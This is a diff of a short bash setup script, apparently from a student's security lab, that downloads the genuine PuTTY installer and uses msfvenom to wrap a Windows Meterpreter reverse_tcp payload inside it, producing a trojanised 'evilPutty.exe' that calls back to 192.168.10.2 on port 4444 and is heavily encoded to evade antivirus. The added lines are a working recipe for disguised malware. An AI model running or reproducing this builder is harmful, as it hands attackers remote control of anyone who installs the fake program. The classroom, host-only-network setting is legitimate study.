@@ -1,21 +1,18 @@
 #!/bin/bash
 #  John Williams
 #  105201054
-#  Date: Sat. Sep. 29, 2018
+#  Date: Fri. Oct. 12, 2018
 #  Program: setup.sh
 
+rm -f evilPutty.exe
+./change_ip.sh -r
 
-ifdown eth0 
-ifconfig eth0 192.168.10.2   
-service apache2 start
-ip addr
+wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
 
+./change_ip.sh 192.168.10.2
 
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 24 -k -x ./putty.exe LHOST=192.168.10.2 LPORT=4444 > evilPutty.exe
 
-apt update; 
-apt install metasploit-framework
-#service postgresql start
-#service metasploit start
-update-rc postgresql enable 
-update-rc.d metasploit enable
+rm -f putty.exe
 
+echo "Please move machine to host only here--->"
